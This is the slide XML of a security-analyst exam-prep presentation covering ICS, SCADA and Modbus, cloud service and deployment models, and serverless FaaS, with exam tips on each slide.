            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Important to externally audit desired workflow</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493</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTOMATION AND CONTROL RISK</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Industrial Control System (ICS)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An Industrial Control System (ICS) is a cyber-physical system that uses software to sense and control physical processes, common in manufacturing and warehousing/distribution and also in applications such as elevators and HVAC.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The interface between the physical world and the computers is provided by field devices such as Remote Terminal Units (RTUs) and Programmable Logic Controllers (PLCs), which read sensors and drive actuators; PLCs commonly run embedded firmware that is difficult to monitor, patch or upgrade.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ICS environments prioritize availability and safety over confidentiality and often cannot tolerate downtime or unexpected traffic, so a security analyst must apply passive monitoring, strict segmentation and careful, tested patching rather than the aggressive scanning and rapid updates used on IT systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect ICS as the umbrella OT term, with PLC/RTU identified as the field controllers and firmware that is hard to patch cited as the core vulnerability-management challenge.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494</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTOMATION AND CONTROL RISK</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Industrial Control System (ICS)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Cyber-physical systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Software to control physical behavior</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Common in manufacturing and warehousing/distribution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Other applications include elevators and HVAC systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Remote Terminal Units (RTU) or Programmable Logic Controllers (PLC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Connect physical world to computers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  PLCs commonly use firmware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Difficult to monitor or upgrade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495</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTOMATION AND CONTROL RISK</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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Supervisory Control and Data Acquisition (SCADA)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SCADA (Supervisory Control and Data Acquisition) is a special class of ICS built to supervise and control cyber-physical systems that are geographically distributed, coordinating and collecting data from remote facilities that can operate autonomously, as in power grids, water utilities and pipelines.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its vulnerabilities stem from long-distance communications with those remote sites and from legacy design: SCADA is typically not modular and relies on protocols such as Modbus, a PLC communication standard that has no authentication, encryption or integrity checking because security was never part of its design.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because these systems underpin critical infrastructure, so a compromised or spoofed Modbus command can have real-world physical consequences, and defenses center on segmentation, protocol-aware monitoring and controlling access to the remote communication links.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Frequently tested alongside ICS, with Modbus named as the insecure, unauthenticated SCADA protocol and the exam emphasizing distributed critical-infrastructure risk.</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496</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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AUTOMATION AND CONTROL RISK</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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Supervisory Control and Data Acquisition (SCADA)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Special class of ICS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Controls cyber-physical systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SCADA vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Communications with remote facilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Autonomous operation of remote facilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  SCADA is not modular</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Modbus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  SCADA (PLC) communication standard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Security not part of its design</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497</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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CLOUD MODELS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Software as a Service (SaaS)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Software as a Service (SaaS) is a cloud service model in which the provider hosts and fully manages a complete application that customers consume over the internet, typically through a browser, with no need to manage the underlying code, runtime, servers or storage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Under the shared responsibility model the provider secures nearly the entire stack, so the customer's remaining responsibility is largely limited to data, user identities, access permissions and configuration, examples being Microsoft 365, Salesforce and Google Workspace.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst focuses SaaS risk on identity and access management, misconfiguration, data governance and third-party/supply-chain exposure, since the customer cannot patch or scan the underlying infrastructure themselves.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Tested as the top-of-stack cloud model where the exam asks you to place the customer/provider boundary and identify misconfiguration and access control as the customer's residual risk.</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498</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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CLOUD MODELS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Software as a Service (SaaS)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g_1dc864a70d.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2378433" y="1783080"/>
            <a:ext cx="7432086" cy="4434840"/>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499</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD MODELS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Platform as a Service (PaaS)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Platform as a Service (PaaS) is a cloud model that provides a ready-made development and runtime environment, including the operating system, middleware, databases and tooling, so developers can build and deploy their own applications without provisioning or maintaining the underlying infrastructure.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  In the shared responsibility split the provider manages the platform and everything beneath it while the customer owns the application code and its data, examples being AWS Elastic Beanstalk, Azure App Service and Google App Engine.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For an analyst, PaaS risk concentrates on insecure application code, vulnerable third-party libraries and dependencies, and API and access-control weaknesses, because the customer can no longer patch the OS but is fully accountable for what they deploy on top of it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Appears in shared-responsibility questions as the middle model where the customer owns application/code and data security while the provider handles the OS and platform.</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500</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD MODELS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Platform as a Service (PaaS)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g_0b76ee5878.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3243507" y="1783080"/>
            <a:ext cx="5701937" cy="4434840"/>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501</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD MODELS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Infrastructure as a Service (IaaS)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Infrastructure as a Service (IaaS) is a cloud model that delivers fundamental computing resources, such as virtual machines, storage and networking, which the customer provisions on demand and controls up through the operating system and everything above it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Here the provider secures only the physical facilities, hardware and virtualization layer, leaving the customer responsible for the guest OS, patching, applications, data, and network configuration, examples being Amazon EC2, Azure Virtual Machines and Google Compute Engine.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  IaaS carries the largest customer security burden of the three models, so an analyst must handle OS hardening and patching, vulnerability scanning of instances, and secure configuration of storage, security groups and firewalls to avoid exposed resources.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam uses IaaS as the model with the heaviest customer responsibility, expecting you to assign OS patching, host hardening and network/storage configuration to the customer.</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502</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD MODELS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Infrastructure as a Service (IaaS)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g_c54a6d0061.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3247505" y="1783080"/>
            <a:ext cx="5693942" cy="4434840"/>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503</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD MODELS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Cloud Deployment Models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Cloud deployment models describe who owns and can access a cloud environment, independent of the service model. In a public cloud, the most popular option, an organization leases connectivity and functionality from a third-party provider whose resources are shared among many tenants.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A private cloud is a collection of servers built and dedicated for a single organization, often in its own data center, and accessible only to internal users, offering greater control at higher cost; a community cloud is a private cloud owned by a consortium and shared among several organizations that have common requirements, such as compliance or mission.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A hybrid cloud combines two or more of these, typically linking a private cloud with public cloud to balance control, cost and scalability. An analyst must know the model in use because it changes the tenancy, data-residency, isolation and monitoring risks that need to be assessed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Tested through scenario prompts that ask you to match public, private, community or hybrid to a stated ownership, tenancy or data-isolation requirement.</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504</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD MODELS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Cloud Deployment Models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Public</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Most popular</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Lease connectivity and functionality from service provider</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Private</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Create collection of servers in your own data center</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Only for internal network users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505</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD MODELS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Cloud Deployment Models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Community</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Private cloud owned by a consortium</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Shared among many entities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Hybrid</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Looks like single cloud but made up of both public and private (and maybe community)</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506</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD MODELS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Cloud Deployment Models (3)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Each model opens up vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Authorization concerns</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Authentication concerns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507</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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REMOTE SERVICE INVOCATION (FAAS, IAC, API)</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Function as a Service (FaaS)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Function as a Service (FaaS) is the execution model behind serverless architecture, in which the customer deploys individual functions that run only in response to events or requests and no servers need to be provisioned, patched or kept running by the customer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The provider manages all underlying compute and scales it automatically, so the customer focuses solely on responding to functionality requests with small units of code; the canonical example is AWS Lambda, alongside Azure Functions and Google Cloud Functions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For an analyst, the security focus shifts to the function code, its dependencies, over-permissioned execution roles, event-source and API trust, and the difficulty of monitoring many short-lived ephemeral executions rather than long-running hosts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: It appears as the serverless model where the exam expects AWS Lambda as the example and a focus on code, permissions and dependencies rather than server patching.</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508</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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REMOTE SERVICE INVOCATION (FAAS, IAC, API)</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Function as a Service (FaaS)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Serverless architecture</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  No servers need to be set up</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Focus is on responding to functionality requests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Example: Amazon Lambda</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509</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

